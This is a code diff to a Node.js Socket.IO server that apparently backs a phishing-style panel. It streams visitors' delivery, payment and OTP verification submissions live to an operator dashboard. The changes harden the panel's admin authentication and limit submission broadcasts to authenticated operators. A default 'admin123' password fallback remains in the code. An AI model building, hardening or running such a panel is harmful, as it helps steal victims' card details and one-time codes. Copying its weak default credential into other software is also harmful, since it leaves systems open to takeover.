@@ -21,35 +21,66 @@ const server = http.createServer(app);
 // Get admin password from env or use default (SHOULD BE CHANGED IN PRODUCTION)
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 
+// ==========================================
+// Socket.IO Configuration
+// ==========================================
 const io = new Server(server, {
   cors: {
-    origin: '*',
+    origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
     methods: ['GET', 'POST', 'PUT', 'DELETE']
   }
 });
 
 // ==========================================
 // Socket.IO Authentication Middleware
+// SECURE: Proper session validation against database
 // ==========================================
 io.use(async (socket, next) => {
-  const token = socket.handshake.auth.token;
+  const sessionToken = socket.handshake.auth.token;
+  const sessionId = socket.handshake.query.sessionId;
   
-  // Check if token matches admin password
-  if (token && token.length >= 4) {
-    try {
-      // Verify token against password (in production, use proper token validation)
-      // For now, we accept any non-empty password as auth
-      // The actual validation happens in admin:login event via HTTP API
-      socket.isAdmin = true;
-      return next();
-    } catch (error) {
-      return next(new Error('Authentication error'));
-    }
+  // Initialize socket as non-admin by default
+  socket.isAdmin = false;
+  socket.adminSession = null;
+  socket.visitorSession = sessionId || null;
+  
+  // If no token provided, this is a visitor connection - allow
+  if (!sessionToken) {
+    socket.isAdmin = false;
+    return next();
   }
   
-  // Allow visitor connections without admin password
-  socket.isAdmin = false;
-  next();
+  try {
+    // Validate admin session token against database
+    const sessionResult = await pool.query(
+      `SELECT * FROM admin_sessions 
+       WHERE session_token = $1 
+       AND (expires_at IS NULL OR expires_at > NOW())`,
+      [sessionToken]
+    );
+    
+    if (sessionResult.rows.length > 0) {
+      // Valid admin session found
+      socket.isAdmin = true;
+      socket.adminSession = sessionResult.rows[0];
+      
+      // Update last activity
+      await pool.query(
+        'UPDATE admin_sessions SET last_activity = NOW() WHERE session_token = $1',
+        [sessionToken]
+      );
+      
+      console.log(`🔐 Admin session validated: ${sessionToken.substring(0, 8)}...`);
+      return next();
+    } else {
+      // Invalid or expired session
+      console.log(`⚠️ Invalid admin session token attempt: ${sessionToken.substring(0, 8)}...`);
+      return next(new Error('Invalid or expired session'));
+    }
+  } catch (error) {
+    console.error('❌ Session validation error:', error.message);
+    return next(new Error('Authentication error'));
+  }
 });
 
 // Middleware
@@ -62,16 +93,30 @@ app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 const connectedClients = new Map();
 const adminConnections = new Map();
 
-// Helper: Check if socket is authenticated admin
-const isAdminAuthenticated = (socket) => {
-  const client = connectedClients.get(socket.id);
-  return client && client.isAdmin === true;
+// Helper: Check if socket is authenticated admin (with session validation)
+const isAdminAuthenticated = async (socket) => {
+  if (!socket.isAdmin) return false;
+  
+  // Additional database validation for critical operations
+  if (socket.adminSession) {
+    const expiresAt = new Date(socket.adminSession.expires_at);
+    if (expiresAt < new Date()) {
+      // Session expired, clean up
+      socket.isAdmin = false;
+      socket.adminSession = null;
+      adminConnections.delete(socket.id);
+      return false;
+    }
+  }
+  
+  return true;
 };
 
-// Helper: Wrapper for admin-only events (send error if not authenticated)
+// Helper: Wrapper for admin-only events (SECURE - async validation)
 const adminOnly = (socket, handler) => {
-  return (...args) => {
-    if (!isAdminAuthenticated(socket)) {
+  return async (...args) => {
+    const isAuth = await isAdminAuthenticated(socket);
+    if (!isAuth) {
       console.log(`⚠️ Unauthorized admin action attempt from ${socket.id}`);
       socket.emit('admin:unauthorized', { message: 'Not authenticated as admin' });
       return;
@@ -79,6 +124,39 @@ const adminOnly = (socket, handler) => {
     return handler(...args);
   };
 };
+
+// Helper: Emit only to authenticated admins (SECURE)
+const emitToAdmins = (event, data) => {
+  const activeAdmins = [];
+  
+  adminConnections.forEach((adminSocket, socketId) => {
+    if (adminSocket.isAdmin) {
+      adminSocket.emit(event, data);
+      activeAdmins.push(socketId);
+    }
+  });
+  
+  console.log(`📡 Emitted ${event} to ${activeAdmins.length} authenticated admins`);
+};
+
+// ==========================================
+// Admin Session Cleanup (Background Job)
+// ==========================================
+const cleanupExpiredSessions = async () => {
+  try {
+    const result = await pool.query(
+      'DELETE FROM admin_sessions WHERE expires_at < NOW()'
+    );
+    if (result.rowCount > 0) {
+      console.log(`🧹 Cleaned up ${result.rowCount} expired admin sessions`);
+    }
+  } catch (error) {
+    console.error('❌ Session cleanup error:', error.message);
+  }
+};
+
+// Run cleanup every hour
+setInterval(cleanupExpiredSessions, 60 * 60 * 1000);
 
 // Socket.IO connection handling
 io.on('connection', (socket) => {
@@ -150,15 +228,12 @@ io.on('connection', (socket) => {
         [sessionId]
       );
       
-      // Notify admins of new visitor with FULL data
+      // SECURE: Only send to authenticated admins using helper
       const newVisitorData = {
         ...visitorResult.rows[0],
         timestamp: new Date()
       };
-      console.log(`📡 Broadcasting visitor:new to ${adminConnections.size} admins:`, JSON.stringify(newVisitorData).substring(0, 200));
-      adminConnections.forEach((adminSocket, socketId) => {
-        adminSocket.emit('visitor:new', newVisitorData);
-      });
+      emitToAdmins('visitor:new', newVisitorData);
 
       socket.emit('visitor:confirmed', { sessionId });
     } catch (error) {
@@ -218,17 +293,14 @@ io.on('connection', (socket) => {
       visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
       visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];
 
-      // Notify all admins with FULL visitor data
-      adminConnections.forEach((adminSocket, socketId) => {
-        adminSocket.emit('visitor:pageChange', {
-          ...visitorData,
-          sessionId,
-          page,
-          timestamp: new Date()
-        });
-        // Also emit visitor:updated to update the card in real-time
-        adminSocket.emit('visitor:updated', visitorData);
+      // SECURE: Only send to authenticated admins using helper
+      emitToAdmins('visitor:pageChange', {
+        ...visitorData,
+        sessionId,
+        page,
+        timestamp: new Date()
       });
+      emitToAdmins('visitor:updated', visitorData);
     } catch (error) {
       console.error('Error updating page:', error);
     }
@@ -275,24 +347,17 @@ io.on('connection', (socket) => {
         [sessionId]
       );
 
-      // Notify admins with FULL visitor data - BROADCAST TO ALL
+      // SECURE: Only send to authenticated admins using helper
       const eventData = {
         ...visitorResult.rows[0],
-        delivery_submissions: submissionsResult.rows, // NEW - include all submissions
+        delivery_submissions: submissionsResult.rows,
         timestamp: new Date()
       };
       
-      // Try adminConnections first
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('form:deliverySubmitted', eventData);
-        adminSocket.emit('visitor:updated', eventData);
-      });
-      
-      // Also broadcast via io.emit to ensure all sockets receive
-      io.emit('form:deliverySubmitted', eventData);
-      io.emit('visitor:updated', eventData);
+      emitToAdmins('form:deliverySubmitted', eventData);
+      emitToAdmins('visitor:updated', eventData);
 
-      console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
+      console.log(`📝 Delivery form submitted by ${sessionId}, emitting to authenticated admins (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
       console.error('Error saving delivery data:', error);
     }
@@ -346,20 +411,15 @@ io.on('connection', (socket) => {
         [sessionId]
       );
 
-      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة - BROADCAST
+      // SECURE: Only send to authenticated admins using helper
       const eventData = {
         ...visitorResult.rows[0],
-        payment_submissions: submissionsResult.rows, // NEW - include all submissions
+        payment_submissions: submissionsResult.rows,
         timestamp: new Date()
       };
       
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('form:paymentSubmitted', eventData);
-        adminSocket.emit('visitor:updated', eventData);
-      });
-      
-      io.emit('form:paymentSubmitted', eventData);
-      io.emit('visitor:updated', eventData);
+      emitToAdmins('form:paymentSubmitted', eventData);
+      emitToAdmins('visitor:updated', eventData);
 
       console.log(`💳 Payment form processed safely for ${sessionId} (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
@@ -427,20 +487,15 @@ io.on('connection', (socket) => {
         [sessionId]
       );
 
-      // Notify admins with FULL visitor data including OTP history - BROADCAST
+      // SECURE: Only send to authenticated admins using helper
       const eventData = {
         ...visitorResult.rows[0],
-        verification_submissions: submissionsResult.rows, // NEW - include all submissions
+        verification_submissions: submissionsResult.rows,
         timestamp: new Date()
       };
       
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('form:verificationSubmitted', eventData);
-        adminSocket.emit('visitor:updated', eventData);
-      });
-      
-      io.emit('form:verificationSubmitted', eventData);
-      io.emit('visitor:updated', eventData);
+      emitToAdmins('form:verificationSubmitted', eventData);
+      emitToAdmins('visitor:updated', eventData);
 
       console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
     } catch (error) {
@@ -868,10 +923,8 @@ io.on('connection', (socket) => {
       // Get updated trash count
       const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
       
-      // Broadcast update to all admins
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('visitor:softDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
-      });
+      // SECURE: Broadcast update to all authenticated admins
+      emitToAdmins('visitor:softDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
       
       console.log('🗑️ Visitor soft deleted:', sessionId);
     } catch (error) {
@@ -895,10 +948,8 @@ io.on('connection', (socket) => {
       // Get updated trash count
       const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
       
-      // Broadcast update to all admins
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('visitor:softDeletedMultiple', { sessionIds, trashCount: parseInt(trashCount.rows[0].count) });
-      });
+      // SECURE: Broadcast update to all authenticated admins
+      emitToAdmins('visitor:softDeletedMultiple', { sessionIds, trashCount: parseInt(trashCount.rows[0].count) });
       
       console.log('🗑️ Multiple visitors soft deleted:', sessionIds.length);
     } catch (error) {
@@ -913,10 +964,8 @@ io.on('connection', (socket) => {
         'UPDATE visitors SET is_deleted = true, last_activity = CURRENT_TIMESTAMP WHERE is_deleted = false'
       );
 
-      // Broadcast update to all admins
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('visitor:softDeletedAll', { trashCount: 0 });
-      });
+      // SECURE: Broadcast update to all authenticated admins
+      emitToAdmins('visitor:softDeletedAll', { trashCount: 0 });
       
       console.log('🗑️ All visitors soft deleted (moved to trash)');
     } catch (error) {
@@ -937,10 +986,8 @@ io.on('connection', (socket) => {
       // Get updated trash count
       const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
       
-      // Broadcast update to all admins
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('visitor:restored', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
-      });
+      // SECURE: Broadcast update to all authenticated admins
+      emitToAdmins('visitor:restored', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
       
       console.log('↩️ Visitor restored:', sessionId);
     } catch (error) {
@@ -958,10 +1005,8 @@ io.on('connection', (socket) => {
       // Get updated trash count
       const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
       
-      // Broadcast update to all admins
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('visitor:permanentDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
-      });
+      // SECURE: Broadcast update to all authenticated admins
+      emitToAdmins('visitor:permanentDeleted', { sessionId, trashCount: parseInt(trashCount.rows[0].count) });
       
       console.log('❌ Visitor permanently deleted:', sessionId);
     } catch (error) {
@@ -974,10 +1019,8 @@ io.on('connection', (socket) => {
     try {
       await pool.query('DELETE FROM visitors WHERE is_deleted = true');
 
-      // Broadcast update to all admins
-      adminConnections.forEach((adminSocket) => {
-        adminSocket.emit('trash:emptied');
-      });
+      // SECURE: Broadcast update to all authenticated admins
+      emitToAdmins('trash:emptied', {});
       
       console.log('🗑️ Trash emptied');
     } catch (error) {
@@ -1012,8 +1055,8 @@ io.on('connection', (socket) => {
     }
   }));
 
-  // Handle unban request
-  socket.on('user:unban', async (data) => {
+  // Handle unban request (ADMIN ONLY)
+  socket.on('user:unban', adminOnly(socket, async (data) => {
     try {
       const { banId } = data;
       if (!banId) return;
@@ -1024,19 +1067,17 @@ io.on('connection', (socket) => {
       socket.emit('user:unbanned', { banId, success: true });
       
       // Notify all admins to refresh their lists
-      adminConnections.forEach((adminSocket, socketId) => {
-        adminSocket.emit('ban:listUpdate');
-      });
+      emitToAdmins('ban:listUpdate', {});
       
       console.log(`✅ User unbanned: ID ${banId}`);
     } catch (error) {
       console.error('Error unbanning user:', error);
       socket.emit('user:unbanned', { success: false, message: error.message });
     }
-  });
+  }));
 
-  // Handle admin session logout
-  socket.on('admin:logoutDevice', async (data) => {
+  // Handle admin session logout (ADMIN ONLY)
+  socket.on('admin:logoutDevice', adminOnly(socket, async (data) => {
     try {
       const { sessionToken } = data;
       await pool.query('DELETE FROM admin_sessions WHERE session_token = $1', [sessionToken]);
@@ -1049,10 +1090,10 @@ io.on('connection', (socket) => {
     } catch (error) {
       console.error('Error logging out device:', error);
     }
-  });
+  }));
 
-  // Handle logout all devices
-  socket.on('admin:logoutAll', async () => {
+  // Handle logout all devices (ADMIN ONLY)
+  socket.on('admin:logoutAll', adminOnly(socket, async () => {
     try {
       await pool.query('DELETE FROM admin_sessions');
       adminConnections.forEach((adminSocket, socketId) => {
@@ -1063,17 +1104,17 @@ io.on('connection', (socket) => {
     } catch (error) {
       console.error('Error logging out all devices:', error);
     }
-  });
+  }));
 
-  // Handle admin device list request
-  socket.on('admin:devices', async () => {
+  // Handle admin device list request (ADMIN ONLY)
+  socket.on('admin:devices', adminOnly(socket, async () => {
     try {
       const devices = await pool.query('SELECT * FROM admin_sessions ORDER BY created_at DESC');
       socket.emit('admin:devicesList', { devices: devices.rows });
     } catch (error) {
       console.error('Error fetching devices:', error);
     }
-  });
+  }));
 
   // Handle disconnect - Grace period before marking offline
   socket.on('disconnect', async () => {
@@ -1092,7 +1133,7 @@ io.on('connection', (socket) => {
             ['idle', client.sessionId]
           );
           
-          // Broadcast idle status immediately
+          // SECURE: Broadcast idle status only to authenticated admins
           const visitorResult = await pool.query(
             'SELECT * FROM visitors WHERE session_id = $1',
             [client.sessionId]
@@ -1103,11 +1144,7 @@ io.on('connection', (socket) => {
               ...visitorResult.rows[0],
               timestamp: new Date()
             };
-            
-            adminConnections.forEach((adminSocket) => {
-              adminSocket.emit('visitor:statusChange', eventData);
-            });
-            io.emit('visitor:statusChange', eventData);
+            emitToAdmins('visitor:statusChange', eventData);
           }
           
           // Set a 60-second timer for offline status
@@ -1120,7 +1157,7 @@ io.on('connection', (socket) => {
                 ['offline', client.sessionId]
               );
               
-              // Broadcast offline status
+              // SECURE: Broadcast offline status only to authenticated admins
               const visitorResult = await pool.query(
                 'SELECT * FROM visitors WHERE session_id = $1',
                 [client.sessionId]
@@ -1131,11 +1168,7 @@ io.on('connection', (socket) => {
                   ...visitorResult.rows[0],
                   timestamp: new Date()
                 };
-                
-                adminConnections.forEach((adminSocket) => {
-                  adminSocket.emit('visitor:statusChange', eventData);
-                });
-                io.emit('visitor:statusChange', eventData);
+                emitToAdmins('visitor:statusChange', eventData);
               }
               
               offlineTimers.delete(client.sessionId);
@@ -1177,8 +1210,14 @@ const PORT = process.env.PORT || 3000;
 
 const startServer = async () => {
   try {
-    // Run database migrations
+    // Initialize database schema (creates all tables if they don't exist)
+    console.log('🔄 Initializing database schema...');
+    await initializeDatabase();
+    console.log('✅ Database schema initialized');
+    
+    // Run any additional migrations
     await runMigrations();
+    
     server.listen(PORT, () => {
       console.log(`🚀 Server running on port ${PORT}`);
       console.log(`🌐 Frontend: http://localhost:${PORT}`);
